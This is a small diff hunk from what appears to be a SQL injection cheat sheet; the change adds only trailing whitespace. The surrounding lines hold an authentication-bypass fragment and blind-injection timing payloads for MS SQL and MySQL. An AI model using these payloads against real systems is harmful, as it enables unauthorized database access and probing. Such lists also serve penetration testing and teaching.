@@ -54,4 +54,4 @@ admin' /*
 
 ========blind SQL injection check====================
 MS SQL: waitfor delay '0:0:10'--
-MySQL: BENCHMARK (howmanytimes, do this)
+MySQL: BENCHMARK (howmanytimes, do this) 
